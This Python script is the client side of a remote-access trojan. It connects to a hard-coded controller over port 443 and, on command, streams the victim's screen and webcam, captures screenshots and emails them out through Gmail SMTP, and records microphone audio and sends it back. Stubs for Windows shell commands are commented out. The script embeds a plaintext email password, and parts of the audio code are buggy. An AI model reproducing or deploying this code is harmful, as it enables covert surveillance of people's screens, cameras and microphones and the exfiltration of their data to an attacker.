from PIL import ImageGrab
from vidstream import *
import socket
import getpass
import smtplib
import base64
import os
import platform
import pyaudio
import wave
import string
clientHOST = "192.168.1.161"
clientPORT = 443
BUFFER_SIZE = 1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((clientHOST, clientPORT))
s.send(str(getpass.getuser()).encode("utf-8"))
while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
    if Handler_DATA == "screenshare":
        screen = ScreenShareClient(clientHOST, 4833)
        screen.start_stream()
    elif Handler_DATA == "webcam_stream":
        webcam = CameraClient(clientHOST, 4833)
        webcam.start_stream()
    elif Handler_DATA == "screenshot":
        screenshot = ImageGrab.grab()
        file = "screenshot.jpg"
        screenshot.save(file)
        f = open('screenshot.jpg', 'rb')
        data=f.read()
        data=base64.b64encode(data)
        f.close()
        os.remove(file)
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login("revise7testing@gmail.com", "Itayf1969#")
        message = data
        smtp.sendmail("revise7testing@gmail.com", "revise7testing@gmail.com", message)
        smtp.quit()
    #elif Handler_DATA == "ipconfig":
        #if platform.system() == "Windows":
    #elif Handler_DATA == "winshell":
        #if platform() == "Windows":
            #os.system(f''''''
    elif Handler_DATA == "audio_record":
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
    
        data1111 = stream.read(1024)
        frames.append(data1111)
    elif Handler_DATA == "audio_record_stop":
        stream.stop_stream()
        stream.close()
        audio.terminate()
        soundfile = wave.open("vid0.wav", "wb")
        soundfile.setnchannels(1)
        soundfile.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        soundfile.setframerate(44100)
        soundfile.writeframes(b''.join(frames))
        soundfile.close()
        with open(soundfile, 'rb') as f:
            for l in f: s.sendall(l)